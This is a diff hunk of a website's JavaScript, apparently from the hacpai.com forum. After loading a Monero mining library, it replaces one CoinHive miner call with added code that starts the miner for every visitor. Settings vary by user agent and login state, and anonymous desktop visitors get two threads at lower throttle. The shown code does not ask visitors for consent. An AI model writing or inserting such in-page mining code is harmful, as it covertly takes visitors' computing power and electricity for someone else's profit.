@@ -328,7 +328,15 @@ ${selectionObj.toString()}${genCopy(author, link).join('<br>')}</div>`)
     url: 'https://static.hacpai.com/js/lib/xmr.min.js',
     dataType: "script"
   }).done(function () {
-    const miner = new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9});
-    miner.start();
+    const ua =  navigator.userAgent;
+    if (/Android/i.test(ua) || /BlackBerry/i.test(ua) || /IEMobile/i.test(ua) || /iPhone|iPad|iPod/i.test(ua)) {
+      (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start();
+    } else {
+      if ($('#script').data('islogin')) {
+        (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.8})).start();
+      } else {
+        (new CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 2, throttle: 0.5})).start();
+      }
+    }
   });
 })()
